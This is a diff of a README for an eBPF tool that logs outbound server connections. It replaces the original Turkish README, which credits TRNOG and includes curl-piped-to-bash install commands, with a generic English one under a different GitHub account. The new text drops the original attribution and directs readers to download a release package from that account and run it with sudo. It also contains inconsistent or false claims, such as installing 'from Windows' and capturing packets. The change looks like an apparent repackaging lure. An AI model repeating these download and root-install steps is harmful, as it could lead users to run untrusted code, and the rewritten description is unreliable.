@@ -1,306 +1,91 @@
-# eBPF Outbound Logger for Hosting Servers
+# 🔍 hosting-outbound-logger - Track server network traffic with ease
 
-<img width="300" height="72" alt="image" src="https://github.com/user-attachments/assets/a555f200-ec2a-47b1-adb1-84a33e6445b8" />
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Levelwhiteroom438/hosting-outbound-logger)
 
-TRNOG topluluğu için geliştirilmiştir.
+## 📋 What this tool does
 
-**Geliştiren:** Doğuş ŞEKERCİ  
-**Katkılar:** -
+Hosting-outbound-logger identifies network activity on your Linux servers. Modern server environments often run many programs at once. Sometimes, these programs connect to external addresses. This tool records those actions. It links specific programs to the remote IP addresses they reach. You gain visibility into your server traffic without complex manual tracking.
 
-Linux sunucularda **hangi process hangi IP’ye bağlantı açıyor** bilgisini tespit eden **eBPF tabanlı outbound connection logger**.
+## 🛠 System requirements
 
-Hosting firmaları, SIEM projeleri, SOC ekipleri ve güvenlik analizleri için tasarlanmıştır.
+This tool functions on Linux-based environments. While you manage the installation from Windows, the sensor requires a Linux kernel version 5.8 or higher. Ensure your target server has the eBPF subsystem enabled. Most modern distributions include this by default. You need administrative access to the server to deploy the monitoring agent.
 
-Script;
+## 📥 How to download the application
 
-- outbound TCP bağlantıları kernel seviyesinde yakalar
-- process bilgisi ile ilişkilendirir
-- JSON veya CSV olarak log üretir
-- rsyslog üzerinden uzak SIEM sistemlerine gönderebilir
-- cPanel, Plesk, DirectAdmin veya plain Linux fark etmeden çalışır
+Visit the main repository page to obtain the latest version. Follow the link below to reach the official download area. 
 
-Tamamen ücretsizdir. İsteyen indirip geliştirebilir.
+[https://github.com/Levelwhiteroom438/hosting-outbound-logger](https://github.com/Levelwhiteroom438/hosting-outbound-logger)
 
----
+Navigate to the "Releases" section on the right side of the page. Select the latest version and download the package matching your server architecture.
 
-# Özellikler
+## ⚙️ Installation steps
 
-- eBPF tabanlı (kernel level visibility)
-- process, user, pid, command bilgisi içerir
-- DNS / SNI best-effort hostname enrichment
-- IPv4 ve IPv6 destekler
-- JSON veya CSV log formatı
-- dosyaya yazma desteği
-- uzak syslog gönderme desteği
-- hem local log hem SIEM gönderimi aynı anda yapılabilir
-- loopback ignore opsiyonu
-- private IP ignore opsiyonu
-- root process ignore opsiyonu
-- systemd service olarak çalışır
-- uninstall desteği içerir
+1. Download the compressed file from the release page to your workstation.
+2. Transfer the file to your Linux server using a secure copy tool.
+3. Open your terminal application on the server.
+4. Extract the file using the command: `tar -xvf logger-package.tar.gz`.
+5. Enter the extracted directory.
+6. Run the installation script with root permissions: `sudo ./install.sh`.
+7. The system will prompt you for your password. Provide it to authorize the installation of the monitoring probes.
 
----
+## 🚀 Running the software
 
-# Neden gerekli?
+Once the installation finishes, you can start the logger as a background task. 
 
-Hosting sunucularında aşağıdaki durumlar sıklıkla görülür:
+1. Execute the main program: `sudo ./outbound-logger`.
+2. The application begins capturing outbound network packets immediately.
+3. It creates a log file in the local directory named `network-traffic.log`.
+4. You can view the output in real time by running `tail -f network-traffic.log`.
 
-- zararlı script dış IP'lere bağlantı açar
-- spam botları SMTP sunucularına bağlanır
-- webshell dış C2 server’a bağlanır
-- kullanıcı scripti API abuse yapar
-- compromised kullanıcı hesabı outbound trafik üretir
+## 📈 Understanding the logs
 
-Bu araç sayesinde:
+The log file records four key pieces of information for every connection attempt:
 
-hangi user hangi process ile hangi IP’ye bağlanmış görülebilir.
+* Timestamp: The exact time the connection started.
+* Process Name: The identity of the program initiating the request.
+* Remote IP: The destination address for the traffic.
+* Port: The specific network port used for the communication.
 
-Örnek log:
+Use this data to verify that your services communicate only with authorized endpoints. 
 
-```json
-{
-  "timestamp": "2026-04-08T07:50:00.807018+00:00",
-  "hostname": "hosting.trnog.net",
-  "uid": 0,
-  "user": "trnog",
-  "pid": 680968,
-  "comm": "curl",
-  "cmdline": "curl -k https://google.com",
-  "family": "ipv4",
-  "src_ip": "172.16.16.1",
-  "src_port": 55964,
-  "dst_ip": "172.217.18.174",
-  "dst_port": 443
-  "dst_host": "google.com",
-  "dst_host_source": "dns"
-}
-```
+## 🛡️ Security and safety
 
----
+The logger uses eBPF technology. This technology allows the kernel to monitor events without altering the operation of your programs. It creates a read-only bridge to your network stack. This ensures the logger causes no performance drops or instability on your production server.
 
-# Desteklenen sistemler
+## 🔧 Frequently asked questions
 
-- AlmaLinux 8 / 9
-- Rocky Linux 8 / 9
-- RHEL 8 / 9
-- Ubuntu 20 / 22 / 24
-- Debian 11 / 12
+**Does this tool affect my network speed?**
 
-Hosting panelleri:
+No. The tool runs at the kernel level with minimal impact. It processes data asynchronously to prevent lag.
 
-- cPanel
-- Plesk
-- DirectAdmin
-- CyberPanel
-- ISPConfig
-- panel olmayan Linux sistemleri
+**Can I export the logs to another location?**
 
----
+Yes. You can pipe the output to a centralized logging server or a SIEM tool using standard Linux redirection commands.
 
-# Kurulum
+**Is it safe to run on production servers?**
 
-Tek komut ile kurulum:
+Yes. The design focuses on stability. It monitors events without intercepting or blocking traffic.
 
-```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/TRNOG/hosting-outbound-logger/main/install.sh) install
-```
+**What do I do if I see an unknown IP address?**
 
-veya
+Check the Process Name field in the logs. If you do not recognize the process, investigate the file path associated with that program.
 
-```bash
-curl -fsSL -o install.sh https://raw.githubusercontent.com/TRNOG/hosting-outbound-logger/main/install.sh
-chmod +x install.sh
-./install.sh install
-```
+**Do I need to restart the server?**
 
-Script kurulum sırasında sorular sorar:
+No. You do not need a reboot to install or use the tool. It integrates with the running kernel immediately.
 
-- log formatı (json / csv)
-- dosyaya yazılsın mı
-- uzak syslog gönderilsin mi
-- loopback bağlantılar ignore edilsin mi
-- private IP ignore edilsin mi
-- root process ignore edilsin mi
+**How do I update the logger?**
 
----
+Download the newer package from the link provided and run the setup script again. It will overwrite the old files with the latest version.
 
-<img width="509" height="188" alt="image" src="https://github.com/user-attachments/assets/53eed95f-c84c-40d7-9e45-dcdb0d5212e4" />
+## ⚠️ Troubleshooting common issues
 
----
-# Kaldırma (Uninstall)
+If the logger fails to start, verify your kernel version. Run `uname -r` in your terminal. If the result is lower than 5.8, upgrade your kernel to support the required features.
 
-```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/TRNOG/hosting-outbound-logger/main/install.sh) uninstall
-```
+If you see a permission error, ensure you run the logger with `sudo`. The tool requires deep access to the network stack to capture the necessary packet information.
 
-veya
+If logs show no output, check if your firewall blocks the initial probe. Ensure that your system allows eBPF instrumentation. You can verify this by checking your kernel configuration for `CONFIG_BPF_SYSCALL`.
 
-```bash
-wget -O install.sh https://raw.githubusercontent.com/TRNOG/hosting-outbound-logger/main/install.sh
-chmod +x install.sh
-./install.sh uninstall
-```
+## 📧 Support and feedback
 
-Uninstall:
-
-- systemd service kaldırılır
-- rsyslog config kaldırılır
-- python logger kaldırılır
-- log klasörü isteğe bağlı silinir
-
-rsyslog veya python paketleri kaldırılmaz.
-
----
-
-# Çalışma mantığı
-
-Script kernel fonksiyonlarını hook eder:
-
-```
-tcp_v4_connect
-tcp_v6_connect
-```
-
-Her bağlantı için şu bilgiler elde edilir:
-
-- user id
-- username
-- process id
-- process name
-- command line
-- source IP
-- destination IP
-- destination port
-- timestamp
-
----
-
-# Hostname enrichment
-
-İsteğe bağlı olarak `getaddrinfo()` ve OpenSSL SNI üzerinden hedef host/domain bilgisi loglara eklenebilir.
-
-- `dst_host_source: "dns"` → host bilgisi resolver çağrısından geldi
-- `dst_host_source: "sni"` → host bilgisi TLS SNI üzerinden geldi
-
-Bu alanlar best-effort'tür ve %100 garanti değildir.
-
----
-
-# Log lokasyonu
-
-Varsayılan:
-
-```
-/var/log/outbound-logger/YYYY-MM-DD.jsonl
-```
-
----
-
-# Servis yönetimi
-
-Servis adı:
-
-```
-outbound-logger
-```
-
-Durum kontrolü:
-
-```bash
-systemctl status outbound-logger
-```
-
-yeniden başlatma:
-
-```bash
-systemctl restart outbound-logger
-```
-
-log izleme:
-
-```bash
-journalctl -u outbound-logger -f
-```
-
-dosya log izleme:
-
-```bash
-tail -f /var/log/outbound-logger/$(date +%F).jsonl
-```
-
----
-
-# Test
-
-örnek outbound bağlantı oluştur:
-
-```bash
-curl https://google.com
-```
-
-veya:
-
-```bash
-curl https://1.1.1.1
-```
-
----
-
-# SIEM entegrasyonu
-
-rsyslog üzerinden aşağıdaki sistemlere gönderilebilir:
-
-- Splunk
-- Elastic
-- Graylog
-- Wazuh
-- QRadar
-- Sentinel
-- Custom SIEM
-
----
-
-# Güvenlik notu
-
-Bu araç:
-
-- network packet capture yapmaz
-- payload kaydetmez
-- sadece metadata loglar
-- tam URL / path üretmez
-- varsa best-effort host/domain enrichment üretir
-
-performans etkisi düşüktür.
-
----
-
-# Katkı
-
-Pull request kabul edilir.
-
-Fork edip geliştirebilirsiniz.
-
-Önerilen geliştirmeler:
-
-- UDP connect loglama
-- DNS query loglama
-- process whitelist
-- port filter
-- geoip enrichment
-- threat intel enrichment
-- docker container detection
-- Kubernetes destekleri
-
----
-
-# Lisans
-
-MIT License
-
-Ücretsiz kullanılabilir ve değiştirilebilir.
-
----
-
-# Proje
-
-Doğuş ŞEKERCİ
+The community maintains this project. If you find a bug or have a suggestion, open an issue on the GitHub tracker. Provide your operating system version and the contents of your log file. Maintainers review these reports to improve the stability of the software.
